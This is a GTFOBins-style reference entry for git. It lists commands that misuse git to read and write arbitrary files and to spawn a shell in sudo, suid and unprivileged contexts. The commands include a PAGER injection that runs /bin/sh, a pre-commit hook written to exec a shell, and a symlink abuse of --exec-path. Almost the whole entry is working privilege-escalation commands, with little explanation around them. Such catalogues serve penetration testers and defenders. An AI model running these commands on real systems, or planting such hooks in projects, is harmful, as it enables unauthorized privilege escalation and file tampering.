---
type: gtfobin
name: git
platform: Unix
functions: [file-read, file-write, inherit, shell]
tags: [gtfobin, unix, lotl]
---

# git

## file-read

```bash
git diff /dev/null /path/to/input-file
```
_The read file content is displayed in `diff` style output format._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
git apply --unsafe-paths --directory / x.patch
```
_The patch can be created locally by creating the file that will be written on the target using its absolute path:

```
echo DATA >/path/to/input-file
git diff /dev/null /path/to/input-file >x.patch
```_
**Contexts:** sudo, suid, unprivileged

## inherit

```bash
git help config
```
**Contexts:** sudo, unprivileged

```bash
git branch --help config
!/bin/sh
```
_The help system can also be reached from any `git` command, e.g., `git branch`._
**Contexts:** sudo, unprivileged

## shell

```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
```
**Contexts:** sudo, unprivileged

```bash
git init .
echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
git -C . commit --allow-empty -m x
```
_Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too._
**Contexts:** sudo, unprivileged

```bash
ln -s /bin/sh git-x
git --exec-path=. x
```
**Contexts:** sudo, suid, unprivileged
